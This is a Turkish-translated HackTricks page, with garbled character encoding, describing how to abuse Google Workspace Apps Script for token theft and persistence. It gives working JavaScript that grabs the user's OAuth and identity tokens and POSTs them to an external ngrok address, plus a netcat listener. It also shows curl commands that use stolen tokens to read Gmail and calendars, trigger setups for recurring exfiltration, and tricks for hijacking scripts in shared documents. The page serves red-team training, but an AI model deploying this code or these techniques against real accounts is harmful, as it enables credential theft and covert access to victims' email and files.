# GWS - App Scripts

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## App Scripts

App Scripts, **App Script'in baÄŸlÄ± olduÄŸu belgeye eriÅŸen bir editÃ¶r iznine sahip kullanÄ±cÄ± tarafÄ±ndan tetiklenecek kodlardÄ±r** ve **OAuth istemini kabul ettikten sonra** Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r.\
AyrÄ±ca, App Script'in sahibi tarafÄ±ndan **belirli bir zaman diliminde Ã§alÄ±ÅŸtÄ±rÄ±lacak ÅŸekilde ayarlanabilir** (SÃ¼reklilik).

### App Script OluÅŸturma

App Script oluÅŸturmanÄ±n birkaÃ§ yolu vardÄ±r, en yaygÄ±n olanlarÄ± **herhangi bir tÃ¼rdeki Google Belgesi'nden** ve **baÄŸÄ±msÄ±z bir proje olarak** oluÅŸturmaktÄ±r:

<details>

<summary>Google Docs, Sheets veya Slides'dan bir konteyner baÄŸlÄ± proje oluÅŸturun</summary>

1. Bir Docs belgesi, bir Sheets elektronik tablosu veya Slides sunumu aÃ§Ä±n.
2. **Eklentiler** > **Google Apps Script**'e tÄ±klayÄ±n.
3. Script editÃ¶rÃ¼nde, **BaÅŸlÄ±ksÄ±z proje**'ye tÄ±klayÄ±n.
4. Projenize bir isim verin ve **Yeniden AdlandÄ±r**'a tÄ±klayÄ±n.

</details>

<details>

<summary>BaÄŸÄ±msÄ±z bir proje oluÅŸturun</summary>

Apps Script'ten baÄŸÄ±msÄ±z bir proje oluÅŸturmak iÃ§in:

1. [`script.google.com`](https://script.google.com/) adresine gidin.
2. **Yeni Proje** ekleyin.
3. Script editÃ¶rÃ¼nde, **BaÅŸlÄ±ksÄ±z proje**'ye tÄ±klayÄ±n.
4. Projenize bir isim verin ve **Yeniden AdlandÄ±r**'a tÄ±klayÄ±n.

</details>

<details>

<summary>Google Drive'dan baÄŸÄ±msÄ±z bir proje oluÅŸturun</summary>

1. [Google Drive](https://drive.google.com/) aÃ§Ä±n.
2. **Yeni** > **Daha Fazla** > **Google Apps Script**'e tÄ±klayÄ±n.

</details>

<details>

<summary>Google Forms'dan bir konteyner baÄŸlÄ± proje oluÅŸturun</summary>

1. Google Forms'da bir form aÃ§Ä±n.
2. Daha Fazla more\_vert > **Script editÃ¶rÃ¼**'ne tÄ±klayÄ±n.
3. Script editÃ¶rÃ¼nde, **BaÅŸlÄ±ksÄ±z proje**'ye tÄ±klayÄ±n.
4. Projenize bir isim verin ve **Yeniden AdlandÄ±r**'a tÄ±klayÄ±n.

</details>

<details>

<summary>clasp komut satÄ±rÄ± aracÄ±nÄ± kullanarak baÄŸÄ±msÄ±z bir proje oluÅŸturun</summary>

`clasp`, terminalden Apps Script projeleri oluÅŸturmanÄ±za, Ã§ekmenize/itmenize ve daÄŸÄ±tmanÄ±za olanak tanÄ±yan bir komut satÄ±rÄ± aracÄ±dÄ±r.

Daha fazla ayrÄ±ntÄ± iÃ§in [Command Line Interface using `clasp` guide](https://developers.google.com/apps-script/guides/clasp) sayfasÄ±na bakÄ±n.

</details>

## App Script Senaryosu <a href="#create-using-clasp" id="create-using-clasp"></a>

### App Script ile Google Sheet OluÅŸturma

Bir App Script oluÅŸturarak baÅŸlayÄ±n, bu senaryo iÃ§in Ã¶nerim bir Google Sheet oluÅŸturmak ve **`Eklentiler > App Scripts`**'e gitmektir, bu sizin iÃ§in **sayfaya baÄŸlÄ± yeni bir App Script aÃ§acaktÄ±r**.

### Token sÄ±zÄ±ntÄ±sÄ±

OAuth token'Ä±na eriÅŸim vermek iÃ§in **`Hizmetler +`'a tÄ±klayÄ±p** aÅŸaÄŸÄ±daki gibi kapsamlar eklemeniz gerekir:

* **AdminDirectory**: Dizinin kullanÄ±cÄ±larÄ±na ve gruplarÄ±na eriÅŸim (kullanÄ±cÄ±nÄ±n yeterli izinleri varsa)
* **Gmail**: Gmail verilerine eriÅŸim
* **Drive**: Drive verilerine eriÅŸim
* **Google Sheets API**: Tetikleyici ile Ã§alÄ±ÅŸmasÄ± iÃ§in

Gerekli **kapsamlarÄ±** kendiniz deÄŸiÅŸtirmek iÃ§in proje ayarlarÄ±na gidip **`appsscript.json` manifest dosyasÄ±nÄ± editÃ¶rde gÃ¶ster** seÃ§eneÄŸini etkinleÅŸtirebilirsiniz.

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

Ä°steÄŸi yakalamak iÃ§in sadece ÅŸunu Ã§alÄ±ÅŸtÄ±rabilirsiniz:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
Permissions requested to execute the App Script:

<figure><img src="../../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
DÄ±ÅŸ bir istek yapÄ±ldÄ±ÄŸÄ±nda OAuth istemi ayrÄ±ca **dÄ±ÅŸ uÃ§ noktalarÄ±na eriÅŸim izni istemektedir**.
{% endhint %}

### Trigger OluÅŸturma

Uygulama okunduktan sonra, bir tetikleyici oluÅŸturmak iÃ§in **â° Tetikleyiciler** Ã¼zerine tÄ±klayÄ±n. **Fonksiyon** olarak **`getToken`** seÃ§in, daÄŸÄ±tÄ±mda **`Head`** olarak Ã§alÄ±ÅŸÄ±r, olay kaynaÄŸÄ±nda **`From spreadsheet`** seÃ§in ve olay tÃ¼rÃ¼ olarak **`On open`** veya **`On edit`** (ihtiyacÄ±nÄ±za gÃ¶re) seÃ§in ve kaydedin.

Bir ÅŸeyi hata ayÄ±klamak isterseniz, **Uygulama Scriptlerinin Ã§alÄ±ÅŸtÄ±rmalarÄ±nÄ± Ã‡alÄ±ÅŸtÄ±rmalar sekmesinde** kontrol edebileceÄŸinizi unutmayÄ±n.

### PaylaÅŸÄ±m

**App Script**'i **tetiklemek** iÃ§in kurbanÄ±n **DÃ¼zenleyici EriÅŸimi** ile baÄŸlanmasÄ± gerekir.

{% hint style="success" %}
**App Script**'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanÄ±lan **token**, **tetikleyicinin yaratÄ±cÄ±sÄ±nÄ±n** token'Ä± olacaktÄ±r, dosya diÄŸer kullanÄ±cÄ±lar tarafÄ±ndan DÃ¼zenleyici olarak aÃ§Ä±lsa bile.
{% endhint %}

### Benimle PaylaÅŸÄ±lan Belgeleri KÃ¶tÃ¼ye Kullanma

{% hint style="danger" %}
EÄŸer biri **App Script ve tetikleyici ile bir belgeyi sizinle paylaÅŸtÄ±ysa ve App Script'in Head'ini kullanÄ±yorsa** (sabit bir daÄŸÄ±tÄ±m deÄŸilse), App Script kodunu deÄŸiÅŸtirebilir (Ã¶rneÄŸin, Ã§alma token fonksiyonlarÄ± ekleyerek), eriÅŸebilir ve **App Script, belgeyi sizinle paylaÅŸan kullanÄ±cÄ±nÄ±n izinleriyle Ã§alÄ±ÅŸtÄ±rÄ±lacaktÄ±r**! (sahiplerin OAuth token'Ä±, tetikleyici oluÅŸturulduÄŸunda verilen eriÅŸim kapsamlarÄ±na sahip olacaktÄ±r).

**Bir bildirim, scriptin yaratÄ±cÄ±sÄ±na birinin scripti deÄŸiÅŸtirdiÄŸini belirten bir bildirim gÃ¶nderilecektir** (uyarÄ±yÄ± Ã¶nlemek iÃ§in gmail izinlerini kullanmak ne olur?).
{% endhint %}

{% hint style="success" %}
EÄŸer bir **saldÄ±rgan App Script'in kapsamlarÄ±nÄ± deÄŸiÅŸtirirse**, gÃ¼ncellemeler **yeni bir tetikleyici** oluÅŸturulmadÄ±kÃ§a belgeye **uygulanmayacaktÄ±r**. Bu nedenle, bir saldÄ±rgan, oluÅŸturduÄŸu tetikleyicide ayarladÄ±ÄŸÄ± kapsamdan daha fazla kapsamla sahiplerin yaratÄ±cÄ± token'Ä±nÄ± Ã§alamayacaktÄ±r.
{% endhint %}

### PaylaÅŸmak Yerine Kopyalama

Bir belgeyi paylaÅŸmak iÃ§in bir baÄŸlantÄ± oluÅŸturduÄŸunuzda, buna benzer bir baÄŸlantÄ± oluÅŸturulur: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
EÄŸer **"/edit"** sonunu **"/copy"** ile **deÄŸiÅŸtirirseniz**, eriÅŸmek yerine google size **belgenin bir kopyasÄ±nÄ± oluÅŸturmak isteyip istemediÄŸinizi soracaktÄ±r:**

<figure><img src="../../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

KullanÄ±cÄ± bunu kopyalayÄ±p eriÅŸirse, hem **belgenin iÃ§eriÄŸi hem de App Scriptler kopyalanacaktÄ±r**, ancak **tetikleyiciler kopyalanmaz**, bu nedenle **hiÃ§bir ÅŸey Ã§alÄ±ÅŸtÄ±rÄ±lmayacaktÄ±r**.

### Web UygulamasÄ± Olarak PaylaÅŸma

Bir **App Script'i Web uygulamasÄ± olarak paylaÅŸmanÄ±n** da mÃ¼mkÃ¼n olduÄŸunu unutmayÄ±n (App Script'in DÃ¼zenleyicisinde, Web uygulamasÄ± olarak daÄŸÄ±tÄ±n), ancak bu tÃ¼r bir uyarÄ± gÃ¶rÃ¼necektir:

<figure><img src="../../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

ArdÄ±ndan gerekli izinleri isteyen **tipik OAuth istemi** gelecektir.

### Test Etme

Toplanan bir token'Ä± e-posta listelemek iÃ§in test edebilirsiniz:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

KullanÄ±cÄ±nÄ±n takvimini listele:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Script olarak SÃ¼reklilik

SÃ¼reklilik iÃ§in bir seÃ§enek, **bir belge oluÅŸturmak ve getToken** fonksiyonu iÃ§in bir tetikleyici eklemek ve belgeyi saldÄ±rganla paylaÅŸmaktÄ±r, bÃ¶ylece saldÄ±rgan dosyayÄ± her aÃ§tÄ±ÄŸÄ±nda **kurbanÄ±n token'Ä±nÄ± dÄ±ÅŸarÄ± aktarÄ±r.**

AyrÄ±ca, bir App Script oluÅŸturmak ve her X zamanda (her dakika, saat, gÃ¼n gibi) tetiklenmesini saÄŸlamak da mÃ¼mkÃ¼ndÃ¼r. **Kompromize olmuÅŸ kimlik bilgileri veya bir kurbanÄ±n oturumu olan bir saldÄ±rgan, her gÃ¼n Ã§ok yetkili bir OAuth token'Ä±nÄ± dÄ±ÅŸarÄ± sÄ±zdÄ±rmak iÃ§in bir App Script zaman tetikleyicisi ayarlayabilir**:

Sadece bir App Script oluÅŸturun, Tetikleyiciler'e gidin, Tetikleyici Ekle'ye tÄ±klayÄ±n ve olay kaynaÄŸÄ± olarak Zaman odaklÄ±yÄ± seÃ§in ve size en uygun seÃ§enekleri seÃ§in:

<figure><img src="../../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Bu, bu konuda bir gÃ¼venlik uyarÄ± e-postasÄ± ve mobil cihazÄ±nÄ±za bir bildirim mesajÄ± oluÅŸturacaktÄ±r.
{% endhint %}

### PaylaÅŸÄ±lan Belge DoÄŸrulanmamÄ±ÅŸ Ä°stemci Atlatma

AyrÄ±ca, eÄŸer biri sizinle **dÃ¼zenleyici eriÅŸimi** olan bir belge **paylaÅŸtÄ±ysa**, belgede **App Script'ler oluÅŸturabilirsiniz** ve belgenin **SAHÄ°BÄ° (yaratÄ±cÄ±sÄ±) App Script'in sahibi olacaktÄ±r**.

{% hint style="warning" %}
Bu, belgenin **yaratÄ±cÄ±sÄ±nÄ±n, iÃ§inde herhangi bir App Script oluÅŸturan herkesin yaratÄ±cÄ±sÄ± olarak gÃ¶rÃ¼neceÄŸi** anlamÄ±na gelir.

Bu aynÄ± zamanda, **App Script'in belgenin yaratÄ±cÄ±sÄ±nÄ±n Workspace ortamÄ± tarafÄ±ndan gÃ¼venilir olacaÄŸÄ±** anlamÄ±na gelir.
{% endhint %}

{% hint style="danger" %}
Bu aynÄ± zamanda, eÄŸer bir **App Script zaten mevcutsa** ve insanlar **eriÅŸim vermiÅŸse**, belgede **DÃ¼zenleyici** iznine sahip olan herkesin **onu deÄŸiÅŸtirebileceÄŸi ve bu eriÅŸimi kÃ¶tÃ¼ye kullanabileceÄŸi** anlamÄ±na gelir.\
Bunu kÃ¶tÃ¼ye kullanmak iÃ§in ayrÄ±ca insanlarÄ±n App Script'i tetiklemesi gerekir. Ve harika bir hile, **script'i bir web uygulamasÄ± olarak yayÄ±nlamaktÄ±r**. **EriÅŸim** vermiÅŸ olan **insanlar** web sayfasÄ±na eriÅŸtiÄŸinde, **App Script'i tetikleyeceklerdir** (bu `<img>` etiketleri kullanarak da Ã§alÄ±ÅŸÄ±r).
{% endhint %}

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
